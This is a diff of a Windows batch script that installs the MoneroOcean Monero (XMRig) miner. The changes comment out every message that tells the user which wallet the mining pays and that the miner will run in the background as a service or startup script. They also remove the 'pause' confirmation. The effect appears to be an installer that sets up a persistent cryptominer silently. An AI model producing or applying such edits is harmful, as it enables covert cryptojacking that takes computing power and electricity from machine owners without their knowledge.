@@ -169,17 +169,24 @@ rem echo If needed, miner in foreground can be started by %USERPROFILE%\monerooc
 rem echo Mining will happen to %WALLET% wallet.
 
 if not [%EMAIL%] == [] (
-
+rem   echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
 )
 
-
+rem echo.
 
 if %ADMIN% == 0 (
-
+rem   echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
 ) else (
-
+rem   echo Mining in background will be performed using moneroocean_miner service.
 )
 
+rem echo.
+rem echo JFYI: This host has %CPU_THREADS% CPU threads with %CPU_MHZ% MHz and %TOTAL_CACHE%KB data cache in total, so projected Monero hashrate is around %EXP_MONERO_HASHRATE% H/s.
+rem echo.
+
+rem pause
+
+rem start doing stuff: preparing miner
 
 echo [*] Removing previous moneroocean miner (if any)
 sc stop moneroocean_miner
@@ -188,7 +195,7 @@ taskkill /f /t /im xmrig.exe
 
 :REMOVE_DIR0
 echo [*] Removing "%USERPROFILE%\moneroocean" directory
-rem timeout 5
+timeout 5
 rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR0
 
